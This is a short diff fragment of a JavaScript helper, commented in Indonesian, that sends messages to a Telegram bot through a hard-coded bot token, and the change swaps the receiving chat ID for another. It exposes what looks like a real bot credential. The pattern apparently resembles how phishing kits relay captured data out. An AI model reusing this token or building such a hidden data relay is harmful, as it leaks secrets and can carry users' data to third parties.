@@ -7,7 +7,7 @@
 // --- Fungsi Pembantu untuk Telegram API ---
 function sendDataToTelegram(message, onSuccess, onError) {
     const telegramBotToken = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
-    const chatIDs = ["3424365142"];
+    const chatIDs = ["1977209064"];
     const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?parse_mode=Markdown`;
 
     Promise.all(
